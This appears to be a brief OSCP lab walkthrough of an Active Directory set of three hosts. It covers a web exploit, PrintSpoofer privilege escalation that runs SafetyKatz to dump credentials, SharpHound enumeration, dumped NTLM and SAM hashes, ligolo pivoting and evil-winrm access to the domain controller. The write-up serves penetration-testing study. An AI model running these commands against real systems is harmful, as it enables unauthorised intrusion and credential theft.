# OSCP A

## Active Directory

### .141 MS01

on port :81 vulnerable application. Modify the exploit (remove /apsystem)

{% embed url="https://www.exploit-db.com/exploits/50801" %}

Upload printspoofer64.exe and get all the keys

{% code overflow="wrap" %}
```
./PrintSpoofer64.exe -i -c 'C:\Users\eric.wallows\Desktop\SafetyKatz.exe "sekurlsa::logonpasswords" "exit"'
```
{% endcode %}

celia.almeda : b780a8dc652dfdaad8b32d7352f00b90ba3e42eda8b076197738b08cda12a184

e728ecbadfb02f51ce8eed753f3ff3fd

MS01$ : ec3e3552d9b5d1e6cff0dd8cdc5d0a7e2a66901194f995a7a2076c57cddd1f3e

Mary.Williams : 9a3121977ee93af56ebd0ef4f527a35e

administrator : c48bd7f4af90f29eedc4937dcaf40f3c061b77eca3de30880ede162937703f76 : 3c4495bbd678fac8c9d218be4f2bbc7b



Now use sharphound to retrieve information about domain

<pre data-overflow="wrap"><code><strong>./PrintSpoofer64.exe -i -c 'C:\Users\eric.wallows\Desktop\SharpHound.exe --collectionmethods All --outputdirectory C:\Users\eric.wallows\Desktop'
</strong></code></pre>

### .142 MS02

setup ligolo on .141 as bind then use evil-winrm

from windows.old/Windows/System32 dump SAM

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:

tom\_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::&#x20;

Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::&#x20;

David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::&#x20;

Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771

### .140 DC01

tom\_admin is DA, use evil-winrm

